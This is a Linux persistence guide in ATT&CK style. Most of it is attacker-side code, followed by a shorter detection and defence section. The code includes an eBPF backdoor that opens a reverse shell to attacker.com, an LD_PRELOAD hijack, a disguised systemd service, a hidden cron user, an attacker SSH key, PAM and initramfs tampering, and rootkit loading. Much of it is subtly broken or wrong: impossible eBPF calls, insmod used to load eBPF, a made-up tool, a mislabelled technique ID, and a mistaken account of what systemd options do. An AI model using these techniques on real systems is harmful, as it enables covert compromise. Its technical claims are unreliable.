# Advanced Linux Persistence

## MITRE ATT&CK Mapping
- **IDs**: T1543.002 (Create/Modify System Process), T1053.008 (eBPF Scripts)
- **Tactic**: TA0003 (Persistence) / TA0005 (Defense Evasion)
- **Platforms**: Linux (all distros with kernel 4.x+)

## Overview

Linux persistence is heavily under-documented compared to Windows. The attack surface differs significantly — most enterprise Linux systems don't have registry-based persistence, and many use systemd for service management. This document covers both common and uncommon Linux persistence methods used by advanced threat actors.

## Uncommon & Advanced Linux Persistence Methods

### 1. eBPF Rootkit Persistence (T1053.008)

eBPF programs run in kernel space and can intercept system calls, modify file operations, and hide processes — all without a loadable kernel module:

```bash
# Compile malicious eBPF program (attacker's perspective)
cat > /tmp/ebpf_backdoor.c << 'EOF'
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, int);
    __type(value, char[256]);
} persistence_map SEC(".maps");

SEC("kprobe/do_execve")
int hack_execve(struct pt_regs *ctx) {
    char payload[] = "/bin/bash -i >& /dev/tcp/attacker.com/4443 0>&1";
    bpf_syscall(SYS_execve, (unsigned long)payload, 0);
    
    // Hide our process from ps/top
    char hide_key[] = "hidden_process";
    __sync_fetch_and_or(&persistence_map[hide_key], 1);
    
    return 0;
}

char _license[] = "GPL";
EOF

# Compile and load (requires CAP_BPF or root)
clang -target bpf -c /tmp/ebpf_backdoor.c -o /tmp/ebpf_backdoor.o
insmod ebpf_loader.ko   # Or use bpf() syscall directly
```

### 2. LD Preload Persistence

The `LD_PRELOAD` environment variable can be set system-wide to force all applications to load a malicious library:

```bash
# System-wide LD_PRELOAD persistence
echo "/usr/lib/libaudit_helper.so" > /etc/ld.so.preload

# Create the malicious preload library (compiled C)
// libaudit_helper.c — hooks audit functions
#include <stdio.h>
#include <dlfcn.h>

int open(const char *pathname, int flags, ...) {
    // Intercept file access for persistence
    if (strstr(pathname, "ssh") || strstr(pathname, "authorized_keys")) {
        return real_open(pathname, flags);  // Pass through legitimate paths
    }
    return -1;  // Block everything else for stealth
}

// Verify it's loading everywhere
ldd /usr/bin/sshd | grep libaudit_helper
```

### 3. Systemd Service Impersonation

Create or modify systemd services to execute malicious code on boot or trigger:

```ini
# /etc/systemd/system/audit-helper.service — disguised as legitimate audit service
[Unit]
Description=System Audit Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/opt/malware/backdoor --config /etc/malware.conf
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

# These prevent the service from being easily found:
PrivateTmp=true
ProtectSystem=strict
ReadOnlyPaths=/usr/bin /bin
```

### 4. Uncommon Linux Persistence Methods

#### a) CRON Job Persistence via Hidden User
```bash
# Create a hidden user account with cron persistence
useradd -s /bin/bash -M -d /tmp/hiddenuser hiddenroot
echo "*/5 * * * * /opt/backdoor/reconnect.sh" > /var/spool/cron/crontabs/hiddenroot
```

#### b) SSH Authorized Keys Persistence (T1098.004)
```bash
# Add persistent SSH key to root's authorized_keys
echo "ssh-rsa AAAA... attacker@evil.com" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Verify persistence:
ls -la /root/.ssh/authorized_keys
cat /root/.ssh/authorized_keys | grep -v "^#"  # Check for unexpected entries
```

#### c) PAM Module Persistence
```bash
# Modify /etc/pam.d/sshd to execute code before auth completes
echo "auth requisite pam_exec.so quiet /opt/backdoor/pam_check.sh" >> /etc/pam.d/sshd
chmod +x /opt/backdoor/pam_check.sh
```

#### d) Filesystem Namespace/Overlay Persistence
```bash
# Create a persistent overlay mount that redirects system binaries to malicious versions
mount --bind /usr/bin/malicious_sshd /usr/bin/sshd
echo "/usr/bin/malicious_sshd /usr/bin/sshd none bind 0 0" >> /etc/fstab

# Survives reboots via fstab entry AND appears as normal filesystem operations
```

#### e) Kernel Thread Injection
```bash
# Inject a persistent kernel thread using kthread_create in a custom module
echo "insmod /tmp/kernel_rootkit.ko" >> /etc/rc.local
chmod +x /etc/rc.local

# The thread runs at the kernel level with no visible user-space presence
```

#### f) Writable Filesystem Mount Points for Persistence
```bash
# Remount /etc as writable for persistent config tampering
mount -o remount,rw /etc
echo "backdoor_rule accept all" >> /etc/sysconfig/iptables
mount -o remount,ro /etc  # Remount read-only to avoid suspicion
```

#### g) Initramfs Modification
```bash
# Modify initramfs to load malicious modules at very early boot
cp /boot/initramfs-$(uname -r).img /tmp/initramfs-backup.img
mkdir /tmp/extracted-initramfs
cd /tmp/extracted-initramfs
zcat ../initramfs-$(uname -r).img | cpio -idmv

# Add malicious init scripts before the real root mounts
echo "/opt/backdoor/start.sh" >> etc/init.d/rcS
find . | cpio -o --quiet | gzip > /boot/initramfs-custom.img
```

## Detection & Hunting for Linux Persistence

### Systemd Service Monitoring
```bash
# Find all systemd services with unusual configuration
find /etc/systemd /usr/lib/systemd -name "*.service" -mtime -7 -exec grep -H "ExecStart" {} \; | grep -v "^#"

# Check for services that weren't installed by the package manager
systemctl list-units --type=service --state=running | awk '{print $1}' | while read svc; do
    if ! rpm -qf /lib/systemd/system/$svc 2>/dev/null && ! dpkg -S /lib/systemd/system/$svc 2>/dev/null; then
        echo "UNPACKAGED SERVICE: $svc"
    fi
done
```

### eBPF Program Inspection
```bash
# Check for loaded eBPF programs
cat /sys/kernel/debug/tracing/trace_pipe
bpftool prog list

# Look for suspicious BPF maps containing network addresses or commands
bpfmap show  # If bpfmap utility is available
```

### LD_PRELOAD Monitoring
```bash
# Check all preload configurations
cat /etc/ld.so.preload
grep -r "LD_PRELOAD" /etc/ /home/ /root/ ~/.profile ~/.bashrc ~/.profile

# Verify every shared library that's been loaded system-wide
ls -la /etc/ld.so.conf.d/*.conf
ldconfig -p | awk '{print $3}' > /tmp/liblist.txt
```

### PAM Module Audit
```bash
# Check for unauthorized PAM modules or configurations
diff /etc/pam.d/sshd <(apt list --installed 2>/dev/null | grep libpam) 2>&1
cat /etc/pam.d/sshd | grep "pam_exec\|pam_python"

# Look for recent changes to any PAM configuration
find /etc/pam.d -type f -mtime -30 -exec cat {} \; | grep -v "^#" 
```

### Process Visibility Comparison
```bash
# Compare ps output with /proc filesystem — if they differ, a kernel-level hook is likely present
ps aux > /tmp/ps_output.txt
ls -d /proc/[0-9]* | while read proc; do
    cat $proc/cmdline 2>/dev/null | tr '\0' ' '
done > /tmp/proc_output.txt

diff <(sort /tmp/ps_output.txt) <(sort /tmp/proc_output.txt)
```

## Defense Strategy

1. **File Integrity Monitoring (FIM)** on `/etc`, `/usr/lib/systemd`, `/boot`, `/var/spool/cron`
2. **Secure Boot** — prevents unauthorized kernel modules from loading
3. **Read-only rootfs** — mount critical system directories as read-only where possible
4. **Systemd hardening** — use `PrivateTmp=yes`, `ProtectSystem=strict` for all services
5. **LD_PRELOAD policy enforcement** — audit `/etc/ld.so.preload` and `/etc/ld.so.conf.d/` regularly

## References
- MITRE ATT&CK T1053.008: https://attack.mitre.org/techniques/T1053/008/
- eBPF Security Research: https://ebpf.io/
- systemd Service Best Practices: https://www.freedesktop.org/software/systemd/man/systemd.service.html
